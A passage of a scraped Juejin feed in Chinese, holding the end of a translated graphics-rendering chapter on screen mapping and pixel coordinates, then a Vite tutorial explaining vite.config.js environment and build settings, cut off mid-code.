xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo>&lt;</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_1 &lt; y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>）。屏幕映射先是平移，然后是缩放操作。新的x和y坐标称为屏幕坐标。z坐标（OpenGL的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[−1,+1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">+</span><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>和DirectX的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>）也被映射到<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>z</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>z</mi><mn>2</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[z_1,z_2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span>，其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">z_1=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span>和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>2</mn></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">z_2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>作为默认值。但是，这些可以通过API进行更改。窗口坐标连同这个重新映射的z值被传递到光栅化阶段。屏幕映射过程如图2.7所示。</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/71a3a07a2c17406093516d89507294cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=HVxwG%2FnH9UGa3L2xMYvQ66E4608%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>图2.7. 投影变换后的图元位于单位立方体中，屏幕映射程序负责在屏幕上找到坐标。</p>
</div>
<p>接下来，我们描述整数和浮点值如何与像素（和纹理坐标）相关。给定像素的水平数组并使用笛卡尔坐标，最左边像素的左边缘在浮点坐标中为0.0。OpenGL一直使用这种方案，DirectX10及其后续版本也使用它。该像素的中心为0.5。因此，一系列像素 [0,9] 覆盖了 [0.0,10.0) 的跨度。转换很简单：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"/><mtd><mrow><mi>d</mi><mo>=</mo><mi>f</mi><mi>l</mi><mi>o</mi><mi>o</mi><mi>r</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"/><mtd><mtext>(2.1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">d = floor(c) \tag{2.1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.02778em;">oor</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2.1</span></span><span class="mord">)</span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"/><mtd><mrow><mi>c</mi><mo>=</mo><mi>d</mi><mo>+</mo><mn>0.5</mn></mrow></mtd><mtd width="50%"/><mtd><mtext>(2.2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">c = d + 0.5 \tag{2.2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.5</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2.2</span></span><span class="mord">)</span></span></span></span></span></span></div>
<p>其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>是像素的离散（整数）索引，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span>是像素内的连续（浮点）值。</p>
<p>虽然所有API的像素位置值都从左到右增加，但在OpenGL和DirectX<sup><a href="#user-content-fn-2" id="user-content-user-content-fnref-2" data-footnote-ref="" aria-describedby="footnote-label" title="#user-content-fn-2">1</a></sup>之间的某些情况下，顶部和底部边缘的零位置不一致。OpenGL始终偏爱笛卡尔系统，将左下角视为最低值元素，而DirectX有时根据上下文将左上角定义为该元素。每个人都有一个逻辑，在他们不同的地方不存在正确的答案。例如，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0</span><span class="mclose">)</span></span></span></span></span>在 OpenGL中位于图像的左下角，而在DirectX中位于左上角。在从一个API迁移到另一个API时，必须考虑到这种差异。</p>
<h3 class="sr-only" id="user-content-footnote-label" data-id="heading-7">Footnotes</h3>
<ol>
<li id="user-content-user-content-fn-2">
<p>“Direct3D”是DirectX的三维图形API组件。DirectX包括其他API元素，例如输入和音频控件。我们不区分在指定特定版本时编写“DirectX”和在讨论此特定API时编写“Direct3D”，而是通过始终编写“DirectX”来遵循常见用法。 <a href="#user-content-fnref-2" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content" title="#user-content-fnref-2">↩</a></p>
</li>
</ol>
</div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vite.config.js 8 大核心模块，一文吃透]]></title>    <link>https://juejin.cn/post/7597634458697383942</link>    <guid>https://juejin.cn/post/7597634458697383942</guid>    <pubDate>2026-01-21T12:46:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597634458697383942" data-draft-id="7597596202025631786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vite.config.js 8 大核心模块，一文吃透"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-01-21T12:46:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="yyt_"/> <meta itemprop="url" content="https://juejin.cn/user/1162607282632969"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vite.config.js 8 大核心模块，一文吃透
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1162607282632969/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    yyt_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:46:38.000Z" title="Wed Jan 21 2026 12:46:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Vite 是什么？—— 面向未来的前端构建工具</h2>
<p>Vite（法语意为“快”）是由 Vue 作者尤雨溪创建的新型前端构建工具。它利用浏览器原生支持 ES 模块（ESM）的能力，在开发环境下实现了极快的冷启动和热更新；而在生产环境中，则通过预构建依赖和 Rollup 打包输出高性能代码。</p>
<p>vite.config.js 作为 Vite 工程的核心配置文件，定义了整个项目的运行规则、编译逻辑和部署方案，是连接 Vite 核心能力与项目实际需求的桥梁，一份完善的 vite.config.js 能够让前端工程化流程更高效、更规范。</p>
<h2 data-id="heading-1">二、核心概念对比：Vite vs Webpack</h2>
<p>虽然 Vite 和 Webpack 都用于构建前端应用，但它们的设计哲学完全不同，核心概念的差异直接决定了两者的使用体验和性能表现：</p>



































<table><thead><tr><th>概念</th><th>Webpack</th><th>Vite</th></tr></thead><tbody><tr><td>Entry（入口）</td><td>显式配置 entry 字段，从 JS 入口开始递归解析依赖</td><td>默认以 index.html 为入口，开发时按需加载 ESM 模块，生产环境可显式配置 HTML 入口</td></tr><tr><td>Chunk（代码块）</td><td>构建阶段静态分析生成 chunks</td><td>开发时无需生成 chunk，生产构建依托 Rollup 实现动态代码拆分</td></tr><tr><td>Loader（转换器）</td><td>使用 loader 处理非 JS 资源（如 babel-loader, sass-loader）</td><td>无明确 Loader 概念，通过插件机制 + 内置转换器处理特殊资源，更灵活高效</td></tr><tr><td>Plugin（插件）</td><td>插件监听生命周期钩子扩展功能</td><td>插件系统强大，支持开发、构建双模式介入，兼容部分 Rollup 插件</td></tr><tr><td>Output（输出）</td><td>输出 bundle 到指定目录，需额外配置优化</td><td>生产环境输出优化后的静态资源，内置多种打包优化策略，配置更简洁</td></tr></tbody></table>
<h3 data-id="heading-2">关键区别：开发与生产环境的差异化处理</h3>
<p>Webpack：开发和生产环境均走完整的打包流程，所有模块需提前编译合并为 bundle 文件，项目体积越大，启动和更新速度越慢。</p>
<p>Vite：</p>
<ol>
<li>开发环境：基于浏览器 ESM 直接运行，不进行全量打包，仅对浏览器请求的模块进行即时编译，响应速度极快。</li>
<li>生产环境：使用 Rollup 进行完整打包，产出经过代码压缩、树摇优化、资源分类的静态资源，兼顾性能与兼容性。</li>
</ol>
<p>这正是 Vite 能够实现“秒级启动”的根本原因，既保证了开发体验，又满足了生产环境的部署要求。</p>
<h2 data-id="heading-3">三、vite.config.js 核心模块配置实战</h2>
<p>vite.config.js 采用模块化导出方式，支持根据环境动态返回配置，下面将按照功能模块拆解配置逻辑，详细说明各部分的配置目的和实现方式。</p>
<h3 data-id="heading-4">模块一：环境初始化与多环境配置</h3>
<p>这是配置文件的前置步骤，核心是获取当前环境变量，实现不同环境下的差异化配置，依赖 Vite 内置的 <code>loadEnv</code> 方法。</p>
<h4 data-id="heading-5">配置逻辑</h4>
<ol>
<li>接收 Vite 传入的 <code>mode</code> 参数，该参数对应启动/构建命令中的环境（如 development、production）。</li>
<li>通过 <code>loadEnv</code> 加载对应环境的配置文件（如 .env.development、.env.production）。</li>
<li>定义不同环境下的公共路径、输出目录等核心配置，实现环境隔离。</li>
</ol>
<h4 data-id="heading-6">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig, loadEnv } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>;
<span class="hljs-keyword">import</span> rimraf <span class="hljs-keyword">from</span> <span class="hljs-string">'rimraf'</span>;

<span class="hljs-comment">// 生成时间戳，用于生产环境版本隔离</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createFileDate</span> () {
  <span class="hljs-keyword">const</span> today = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
  <span class="hljs-keyword">const</span> y = today.<span class="hljs-title function_">getFullYear</span>();
  <span class="hljs-keyword">const</span> m = today.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span> &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span> : <span class="hljs-string">'0'</span> + (today.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span>);
  <span class="hljs-keyword">const</span> d = today.<span class="hljs-title function_">getDate</span>() &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getDate</span>() : <span class="hljs-string">'0'</span> + today.<span class="hljs-title function_">getDate</span>();
  <span class="hljs-keyword">const</span> h = today.<span class="hljs-title function_">getHours</span>() &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getHours</span>() : <span class="hljs-string">'0'</span> + today.<span class="hljs-title function_">getHours</span>();
  <span class="hljs-keyword">const</span> M = today.<span class="hljs-title function_">getMinutes</span>() &gt; <span class="hljs-number">9</span> ? today.<span class="hljs-title function_">getMinutes</span>() : <span class="hljs-string">'0'</span> + today.<span class="hljs-title function_">getMinutes</span>();
  <span class="hljs-keyword">return</span> y + <span class="hljs-string">''</span> + m + <span class="hljs-string">''</span> + d + <span class="hljs-string">''</span> + h + <span class="hljs-string">''</span> + M;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> ({ mode }) =&gt; {
  <span class="hljs-comment">// 第一步：加载环境变量，指定环境配置文件所在目录</span>
  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">loadEnv</span>(mode, path.<span class="hljs-title function_">join</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'./env'</span>));
  <span class="hljs-keyword">const</span> fileDateDir = <span class="hljs-title function_">createFileDate</span>();
  
  <span class="hljs-comment">// 第二步：定义多环境核心配置项</span>
  <span class="hljs-comment">// 生产环境 CDN 公共路径</span>
  <span class="hljs-keyword">const</span> prodPublicPath = <span class="hljs-string">`https://yyt.com/resources/ph7/<span class="hljs-subst">${fileDateDir}</span>/`</span>;
  <span class="hljs-comment">// 测试环境本地公共路径</span>
  <span class="hljs-keyword">const</span> testPublicPath = <span class="hljs-string">'/ph7/'</span>;
  
  <span class="hljs-comment">// 第三步：生产环境前置清理旧构建产物</span>
  <span class="hljs-keyword">if</span> (mode === <span class="hljs-string">'production'</span>) {
    <span class="hljs-title function_">rimraf</span>(path.<span class="hljs-title function_">join</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'./dist'</span>), <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (err) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'清理 dist 目录失败：'</span>, err);
    });
  }

  <span class="hljs-comment">// 返回最终配置</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-comment">// 配置公共基础路径，根据环境切换</span>
    <span class="hljs-attr">base</span>: mode === <span class="hljs-string">'production'</span> ? prodPublicPath : testPublicPath,
    <span class="hljs-comment">// 其他核心配置...</span>
  });
};
</code></pre>
<h4 data-id="heading-7">配置说明</h4>
<ol>
<li><code>loadEnv</code> 第一个参数为环境模式，第二个参数为环境配置文件目录，会自动加载该目录下 <code>.env.${mode}</code> 格式的文件。</li>
<li>生产环境构建前通过 <code>rimraf</code> 清理旧的 <code>dist</code> 目录，避免旧资源残留导致部署问题。</li>
<li>公共路径 <code>base</code> 用于配置打包后资源的根路径，生产环境配置 CDN 地址，测试环境配置本地子路径，解决资源 404 问题。</li>
</ol>
<h3 data-id="heading-8">模块二：生产构建配置（build）</h3>
<p>该模块是 vite.config.js 的核心之一，用于定义生产环境打包的输出规则、优化策略，所有配置均放在 <code>build</code> 字段下，依托 Rollup 实现打包能力。</p>
<h4 data-id="heading-9">配置逻辑</h4>
<ol>
<li>配置差异化输出目录，实现生产环境版本隔离。</li>
<li>开启输出目录自动清空，避免手动清理遗漏。</li>
<li>配置 Rollup 打包参数，包括入口、代码块输出规则、静态资源分类输出规则。</li>
<li>配置插件实现打包后资源自动拷贝，满足本地部署需求。</li>
<li>配置 SourceMap 生成规则，兼顾调试与安全。</li>
</ol>
<h4 data-id="heading-10">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 其他配置...</span>
  <span class="hljs-attr">build</span>: {
    <span class="hljs-comment">// 1. 差异化输出目录：生产环境带时间戳，测试环境简易目录</span>
    <span class="hljs-attr">outDir</span>: mode === <span class="hljs-string">'production'</span> ? <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>`</span> : <span class="hljs-string">'dist'</span>,
    <span class="hljs-comment">// 2. 打包前自动清空 outDir 对应的目录</span>
    <span class="hljs-attr">emptyOutDir</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-comment">// 3. 是否生成 SourceMap：开发环境生成，生产环境关闭（安全+减小体积）</span>
    <span class="hljs-attr">sourcemap</span>: mode === <span class="hljs-string">'development'</span>,
    <span class="hljs-comment">// 4. Rollup 打包详细配置</span>
    <span class="hljs-attr">rollupOptions</span>: {
      <span class="hljs-comment">// 配置打包入口：指定 index.html 作为入口文件</span>
      <span class="hljs-attr">input</span>: {
        <span class="hljs-attr">main</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'index.html'</span>)
      },
      <span class="hljs-comment">// 配置输出规则</span>
      <span class="hljs-attr">output</span>: {
        <span class="hljs-comment">// 入口代码块输出规则：输出到 assets/js 目录，添加 hash 后缀</span>
        <span class="hljs-attr">entryFileNames</span>: <span class="hljs-string">'assets/js/[name]-[hash].js'</span>,
        <span class="hljs-comment">// 公共/异步代码块输出规则：与入口代码块统一目录</span>
